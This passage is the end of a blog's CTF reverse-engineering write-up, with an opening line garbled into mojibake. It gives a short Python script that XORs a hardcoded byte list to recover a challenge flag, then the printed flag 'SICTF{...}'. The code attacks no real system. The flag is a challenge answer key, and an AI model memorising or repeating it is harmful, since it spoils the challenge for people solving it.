æ­¤æŒ‰ç…§åŸé€»è¾‘ä¾¿å¯ä»¥è§£å‡ºç­”æ¡ˆï¼Œä»£ç å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> operator <span class="hljs-keyword">import</span> xor<br><br>ans = [<span class="hljs-number">16</span>, <span class="hljs-number">29</span>, <span class="hljs-number">67</span>, <span class="hljs-number">84</span>, <span class="hljs-number">31</span>, <span class="hljs-number">75</span>, <span class="hljs-number">89</span>, <span class="hljs-number">48</span>, <span class="hljs-number">30</span>, <span class="hljs-number">111</span>, <span class="hljs-number">107</span>, <span class="hljs-number">48</span>, <span class="hljs-number">49</span>, <span class="hljs-number">52</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">110</span>, <span class="hljs-number">51</span>, <span class="hljs-number">44</span>, <span class="hljs-number">69</span>, <span class="hljs-number">95</span>, <span class="hljs-number">118</span>, <span class="hljs-number">74</span>, <span class="hljs-number">45</span>, <span class="hljs-number">121</span>, <span class="hljs-number">95</span>, <span class="hljs-number">70</span>, <span class="hljs-number">84</span>, <span class="hljs-number">49</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">113</span>, <span class="hljs-number">125</span>]<br>flag = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ans), <span class="hljs-number">4</span>):<br>        flag.append(<span class="hljs-built_in">chr</span>(xor(ans[i], ans[i + <span class="hljs-number">2</span>])))<br>        flag.append(<span class="hljs-built_in">chr</span>(xor(ans[i + <span class="hljs-number">1</span>], ans[i + <span class="hljs-number">3</span>])))<br>        flag.append(<span class="hljs-built_in">chr</span>(ans[i + <span class="hljs-number">2</span>]))<br>        flag.append(<span class="hljs-built_in">chr</span>(ans[i + <span class="hljs-number">3</span>]))<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span>.join(flag)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flag:</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">SICTF&#123;Y0u_k0nw_Ch1n3s3_v3ry_we11!!!!qwq&#125;![Hello Blog](test.jpg)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
